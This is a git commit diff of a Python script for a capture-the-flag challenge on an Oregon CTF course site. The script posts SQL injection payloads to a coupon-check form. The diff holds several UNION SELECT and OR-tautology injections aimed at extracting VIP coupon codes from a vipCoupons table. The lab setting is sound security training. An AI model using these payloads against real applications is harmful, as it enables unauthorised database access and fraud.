a10bdb1c3159871506476ebdc7f344af742f614d
Alex Rose <al3xrose@gmail.com>
2019-02-23 19:06:49 -0800

    Completed couponCheck / injection#5

--- couponCheck.py
+++ couponCheck.py
@@ -8,9 +8,15 @@ url = "http://cs495.oregonctf.org/login"
 
 response = session.post(url, data=loginpayload)
 
-targetUrl = "http://cs495.oregonctf.org/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck"
+targetUrl = "http://cs495.oregonctf.org/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck"
 
-postData = {"couponCode": "\' UNION SELECT itemId, couponCode, percentOff FROM vipCoupons WHERE itemId = \"1\" -- "}
+#postData = {"couponCode": "\' union select itemId,percentOff,CONCAT(\'itemID is: \',itemId,\'  percentOff is: \',percentOff, \' couponCode is: \', couponCode, \\' end \')  from vipCoupons; -- "}
+#postData = {"couponCode": "\' OR \"1\" = \"1\" UNION SELECT itemId, couponCode, percentOff FROM vipCoupons WHERE percentOff = \"100\"; -- " }
+#response2 = session.post(targetUrl, data=postData)
+#print(response2.text)
+#print(response2.headers)
+#print(response2.cookies.__dict__)
+postData = {"couponCode": "\' union select itemId,percentOff,CONCAT(\"itemID is: \",itemId,\"  percentOff is: \",percentOff, \" couponCode is: \", couponCode, \" end \")  from vipCoupons; -- "}
 #postData = {"couponCode": "coupon\' UNION SELECT itemId, percentOff, couponCode FROM vipCoupons LIMIT 1 -- "}
 #postData = {"couponCode": "\' OR \"1\" = \"1\" -- "}
 #postData = {"couponCode": "\' UNION SELECT 1, 1, 1 -- "}
